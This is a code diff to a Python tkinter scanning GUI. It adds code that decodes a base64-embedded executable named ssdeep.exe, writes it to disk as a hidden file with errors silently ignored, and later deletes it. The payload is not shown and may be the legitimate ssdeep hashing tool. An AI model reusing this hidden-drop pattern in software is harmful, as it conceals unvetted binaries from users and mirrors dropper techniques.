@@ -4,6 +4,10 @@ from tkinter import filedialog
 import os
 import time
 import threading
+import base64
+import win32api
+import win32con
+from encoded import ssdeep_string
 
 # scripts we've written
 from hash import *
@@ -126,6 +130,19 @@ class GUI(tk.Tk):
         t.start()
 
     def button6_callback(self):
+
+        # decode the base64-encoded string of .exe
+        decoded_data = base64.b64decode(ssdeep_string())
+        # write the decoded data to a hidden file
+        try:
+            with open("ssdeep.exe", 'wb') as f: 
+                f.write(decoded_data)
+                
+            # set the file attributes to hidden
+            win32api.SetFileAttributes("ssdeep.exe", win32con.FILE_ATTRIBUTE_HIDDEN)
+        except:
+            pass
+
         if self.var1.get() == True:   
             self.status_label.configure(text="status : pending ...")
             self.update()
@@ -150,6 +167,11 @@ class GUI(tk.Tk):
             self.status_label.configure(text="status : pending ...")
             self.update()
             netstat(self, [self.scannig_label, self.status_label, self.db_label, self.circle_label], collection, tk.Label)
+
+        try:
+            os.remove("ssdeep.exe")
+        except:
+            pass
 
     def connection(self):
         # time.sleep(2)
